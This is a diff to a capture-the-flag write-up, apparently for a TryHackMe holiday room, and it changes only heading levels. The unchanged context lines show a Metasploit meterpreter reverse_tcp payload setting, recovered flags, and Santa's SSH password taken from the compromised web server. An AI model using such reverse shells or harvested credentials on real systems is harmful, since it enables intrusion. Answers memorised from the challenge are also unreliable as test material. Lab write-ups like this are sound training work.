@@ -55,7 +55,7 @@ set PAYLOAD linux/x86/meterpreter/reverse_tcp # Link the reverse TCP to the stru
 exploit
 ```
 
-### #1 Compromise the web server using Metasploit. What is flag1?
+## 1 Compromise the web server using Metasploit. What is flag1?
 
 On the question we have the name of the flag so let's find it !
 
@@ -77,7 +77,7 @@ THM{3ad96bb13ec963a5ca4cb99302b37e12}
 THM{3ad96bb13ec963a5ca4cb99302b37e12} # flag
 ```
 
-### #2 Now you've compromised the web server, get onto the main system. What is Santa's SSH password?
+## 2 Now you've compromised the web server, get onto the main system. What is Santa's SSH password?
 
 On the question we have the name 'santa' let's see if there is some users on the /home directory
 
@@ -108,7 +108,7 @@ santa:rudolphrednosedreindeer
 rudolphrednosedreindeer # flag
 ```
 
-### #3 Who is on line 148 of the naughty list?
+## 3 Who is on line 148 of the naughty list?
 
 Now that we have the ssh creds on the santa's accont let's use it !
 
@@ -124,7 +124,7 @@ password: rudolphrednosedreindeer
 Melisa Vanhoose
 ```
 
-### #4 Who is on line 52 of the nice list?
+## 4 Who is on line 52 of the nice list?
 
 ```bash
 [santa@ip-10-10-21-228 ~]$ sed '52!d' nice_list.txt
